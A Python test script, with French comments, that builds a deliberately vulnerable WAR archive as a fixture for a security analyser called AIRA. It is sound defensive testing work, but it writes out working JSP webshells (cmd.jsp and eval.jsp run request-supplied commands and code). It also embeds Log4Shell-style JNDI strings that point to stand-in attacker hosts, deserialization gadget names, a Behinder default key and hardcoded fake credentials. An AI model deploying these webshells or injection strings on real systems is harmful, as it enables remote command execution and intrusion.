"""
Génère un fichier WAR de test avec des vulnérabilités simulées
pour tester l'analyseur WAR d'AIRA.

Usage: python tests/create_test_war.py
Crée: tests/samples/vulnerable_app.war
"""
import struct
import zipfile
from pathlib import Path

OUTPUT = Path(__file__).parent / "samples"
OUTPUT.mkdir(parents=True, exist_ok=True)
WAR_PATH = OUTPUT / "vulnerable_app.war"


def make_fake_class(class_name: str, strings: list[str]) -> bytes:
    """Crée un faux fichier .class avec le magic CAFEBABE + strings injectées."""
    magic = b"\xca\xfe\xba\xbe"
    # Version Java 11 (major=55, minor=0)
    version = struct.pack(">HH", 0, 55)
    # Injecter les strings comme si elles étaient dans le constant pool
    payload = "\x00".join(strings).encode("utf-8")
    padding = b"\x00" * 64
    return magic + version + padding + payload + padding


def main():
    with zipfile.ZipFile(str(WAR_PATH), "w", zipfile.ZIP_DEFLATED) as zf:

        # ── META-INF/MANIFEST.MF ──
        zf.writestr("META-INF/MANIFEST.MF", """Manifest-Version: 1.0
Created-By: Apache Maven 3.8.6
Built-By: dev-team
Build-Jdk: 11.0.16
Implementation-Title: VulnerableApp
Implementation-Version: 1.3.7
Implementation-Vendor: ACME Corp
""")

        # ── WEB-INF/web.xml (avec misconfigs) ──
        zf.writestr("WEB-INF/web.xml", """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="4.0">

  <display-name>VulnerableApp</display-name>

  <context-param>
    <param-name>org.apache.catalina.listings</param-name>
    <param-value>true</param-value>
  </context-param>

  <servlet>
    <servlet-name>MainServlet</servlet-name>
    <servlet-class>com.acme.app.MainServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>MainServlet</servlet-name>
    <url-pattern>/api/*</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.acme.app.admin.AdminShellServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin/*</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>DebugProxy</servlet-name>
    <servlet-class>com.acme.debug.ProxyInvokeServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DebugProxy</servlet-name>
    <url-pattern>/*</url-pattern>
  </servlet-mapping>

  <filter>
    <filter-name>AuthFilter</filter-name>
    <filter-class>com.acme.app.filters.AuthenticationFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>AuthFilter</filter-name>
    <url-pattern>/api/*</url-pattern>
  </filter-mapping>

  <listener>
    <listener-class>com.acme.app.StartupListener</listener-class>
  </listener>

  <session-config>
    <session-timeout>60</session-timeout>
    <cookie-config>
      <http-only>false</http-only>
      <secure>false</secure>
    </cookie-config>
  </session-config>

  <!-- Pas d'error-page configuré = stack traces exposées -->
  <!-- Pas de security-constraint = tout est public -->

</web-app>
""")

        # ── WEB-INF/lib/ — Bibliothèques vulnérables (faux JARs) ──
        vulnerable_jars = [
            "log4j-core-2.14.1.jar",
            "commons-collections-3.2.1.jar",
            "commons-fileupload-1.3.1.jar",
            "spring-core-5.3.17.jar",
            "spring-beans-5.3.17.jar",
            "fastjson-1.2.68.jar",
            "jackson-databind-2.9.10.jar",
            "shiro-core-1.4.1.jar",
            "struts2-core-2.5.22.jar",
            "h2-1.4.199.jar",
            "mysql-connector-java-5.1.49.jar",
            "c3p0-0.9.5.2.jar",
            "xstream-1.4.17.jar",
            "velocity-1.7.jar",
            "commons-beanutils-1.9.3.jar",
        ]
        # JARs normaux (pas vulnérables)
        normal_jars = [
            "slf4j-api-1.7.36.jar",
            "guava-31.1-jre.jar",
            "gson-2.10.jar",
            "javax.servlet-api-4.0.1.jar",
            "jstl-1.2.jar",
        ]
        for jar in vulnerable_jars + normal_jars:
            # Contenu minimal pour que ce soit un ZIP valide comme JAR
            zf.writestr(f"WEB-INF/lib/{jar}", f"PK-fake-jar-{jar}")

        # ── WEB-INF/classes/ — Classes Java simulées ──

        # 1. Classe principale (inoffensive)
        zf.writestr("WEB-INF/classes/com/acme/app/MainServlet.class",
            make_fake_class("MainServlet", [
                "com/acme/app/MainServlet",
                "javax/servlet/http/HttpServlet",
                "doGet", "doPost",
                "request.getParameter",
                "response.getWriter",
                "application/json",
            ]))

        # 2. Classe avec Runtime.exec (RCE)
        zf.writestr("WEB-INF/classes/com/acme/app/admin/AdminShellServlet.class",
            make_fake_class("AdminShellServlet", [
                "com/acme/app/admin/AdminShellServlet",
                "Runtime.getRuntime().exec(cmd)",
                "ProcessBuilder",
                "request.getParameter",
                "cmd.exe",
                "/bin/sh",
                "getOutputStream",
                "getInputStream",
                "java.lang.Runtime",
                "password=Adm1n$ecret!",
            ]))

        # 3. Classe avec deserialization dangereuse
        zf.writestr("WEB-INF/classes/com/acme/app/DeserializeHandler.class",
            make_fake_class("DeserializeHandler", [
                "com/acme/app/DeserializeHandler",
                "ObjectInputStream",
                "readObject",
                "java.io.ObjectInputStream",
                "InvokerTransformer",
                "ChainedTransformer",
                "CommonsCollections",
                "LazyMap",
                "ysoserial",
            ]))

        # 4. Classe avec JNDI Injection (Log4Shell vector)
        zf.writestr("WEB-INF/classes/com/acme/app/LookupService.class",
            make_fake_class("LookupService", [
                "com/acme/app/LookupService",
                "InitialContext",
                "Context.lookup",
                "ldap://evil.attacker.com/exploit",
                "rmi://malware.server.net:1099/payload",
                "${jndi:ldap://evil.com/a}",
                "JndiLookup",
            ]))

        # 5. Classe avec SQL Injection
        zf.writestr("WEB-INF/classes/com/acme/app/dao/UserDAO.class",
            make_fake_class("UserDAO", [
                "com/acme/app/dao/UserDAO",
                "createStatement",
                "executeQuery",
                "Statement.execute",
                "SELECT * FROM users WHERE username='",
                "getParameter",
                "jdbc:mysql://db.internal:3306/appdb",
                "root",
                "DBp4ssw0rd!",
            ]))

        # 6. Classe avec XXE
        zf.writestr("WEB-INF/classes/com/acme/app/XmlParser.class",
            make_fake_class("XmlParser", [
                "com/acme/app/XmlParser",
                "DocumentBuilder",
                "DocumentBuilderFactory",
                "SAXParser",
                "XMLReader",
                "TransformerFactory",
                "file:///etc/passwd",
            ]))

        # 7. Config avec secrets
        zf.writestr("WEB-INF/classes/com/acme/app/Config.class",
            make_fake_class("Config", [
                "com/acme/app/Config",
                "api_key=sk-proj-A1B2C3D4E5F6G7H8I9J0",
                "secret_key=MyS3cretK3y!@#$%",
                "password=SuperS3cret123!",
                "jdbc:mysql://root:r00tP4ss@db.acme.internal:3306/production",
                "aws_access_key_id=AKIAIOSFODNN7EXAMPLE",
                "smtp://admin:mail_pass@smtp.acme.com:587",
                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0",
            ]))

        # 8. Classe avec reflection dangereuse
        zf.writestr("WEB-INF/classes/com/acme/app/PluginLoader.class",
            make_fake_class("PluginLoader", [
                "com/acme/app/PluginLoader",
                "Class.forName",
                "Method.invoke",
                "ClassLoader",
                "defineClass",
                "sun.misc.Unsafe",
                "getMethod",
            ]))

        # 9. Classe réseau suspecte
        zf.writestr("WEB-INF/classes/com/acme/app/Callback.class",
            make_fake_class("Callback", [
                "com/acme/app/Callback",
                "ServerSocket",
                "Socket(",
                "URLConnection",
                "HttpClient",
                "java.net.Socket",
                "getOutputStream",
                "getInputStream",
                "/bin/bash",
            ]))

        # 10. Classe avec crypto faible
        zf.writestr("WEB-INF/classes/com/acme/app/CryptoUtil.class",
            make_fake_class("CryptoUtil", [
                "com/acme/app/CryptoUtil",
                "DES/ECB",
                "MD5",
                "SHA-1",
                "Cipher.getInstance",
                "ECB/PKCS5Padding",
                "DESede",
                "SecureRandom()",
            ]))

        # 11. Classe Behinder-like (webshell célèbre)
        zf.writestr("WEB-INF/classes/com/acme/shell/Agent.class",
            make_fake_class("Agent", [
                "com/acme/shell/Agent",
                "e45e329feb5d925b",  # clé par défaut Behinder
                "AES",
                "javax.crypto.Cipher",
                "defineClass",
                "ClassLoader",
                "behinder",
            ]))

        # ── JSP Files ──

        # 12. JSP Webshell classique (à la racine !)
        zf.writestr("cmd.jsp", """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
""")

        # 13. JSP avec ScriptEngine (eval)
        zf.writestr("eval.jsp", """<%@ page import="javax.script.*"%>
<%
ScriptEngineManager manager = new javax.script.ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("js");
String code = request.getParameter("code");
if (code != null) {
    Object result = engine.eval(code);
    out.println(result);
}
%>
""")

        # 14. JSP dans un sous-dossier (plus normal)
        zf.writestr("WEB-INF/views/login.jsp", """<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<body>
<form action="/api/login" method="POST">
    <input name="username" />
    <input name="password" type="password" />
    <button>Login</button>
</form>
</body>
</html>
""")

        # 15. JSP admin
        zf.writestr("admin/dashboard.jsp", """<%@ page contentType="text/html;charset=UTF-8" %>
<%@ page import="java.sql.*, javax.naming.*" %>
<%
// Direct JNDI lookup - vulnerable
InitialContext ctx = new InitialContext();
Object ds = ctx.lookup(request.getParameter("resource"));
%>
<html><body><h1>Admin Dashboard</h1></body></html>
""")

        # ── Config files ──

        # 16. application.properties avec secrets
        zf.writestr("WEB-INF/classes/application.properties", """
# Application Configuration
server.port=8080
spring.application.name=VulnerableApp

# Database
spring.datasource.url=jdbc:mysql://db.acme.internal:3306/production
spring.datasource.username=root
spring.datasource.password=r00tP4ss!2024

# Redis
spring.redis.host=redis.acme.internal
spring.redis.password=Redis$ecret99

# Email
spring.mail.host=smtp.acme.com
spring.mail.username=noreply@acme.com
spring.mail.password=MailP4ss!

# AWS
cloud.aws.credentials.access-key=AKIAIOSFODNN7EXAMPLE
cloud.aws.credentials.secret-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# API Keys
app.external.api-key=sk-proj-AABBCCDD11223344
app.jwt.secret=MyJwtS3cretK3yThatIsWayTooSimple!

# Logging
logging.level.root=DEBUG
logging.level.org.springframework.security=TRACE
""")

        # 17. Un fichier JSON de config
        zf.writestr("WEB-INF/classes/config.json", """{
  "database": {
    "host": "db.acme.internal",
    "port": 3306,
    "username": "admin",
    "password": "Adm1nDB_P4ss!"
  },
  "api_keys": {
    "stripe": "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
    "sendgrid": "SG.XXXXXXXXXXXXXXXXXX"
  }
}
""")

        # ── Static files ──
        zf.writestr("index.html", """<!DOCTYPE html>
<html>
<head><title>ACME App</title></head>
<body>
<h1>Welcome to ACME Vulnerable App</h1>
<p>Version 1.3.7</p>
</body>
</html>
""")
        zf.writestr("css/style.css", "body { font-family: sans-serif; }")
        zf.writestr("js/app.js", "console.log('ACME App loaded');")
        zf.writestr("images/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)

    print(f"WAR de test cree : {WAR_PATH}")
    print(f"Taille : {WAR_PATH.stat().st_size / 1024:.1f} KB")
    print(f"Chemin absolu : {WAR_PATH.resolve()}")


if __name__ == "__main__":
    main()
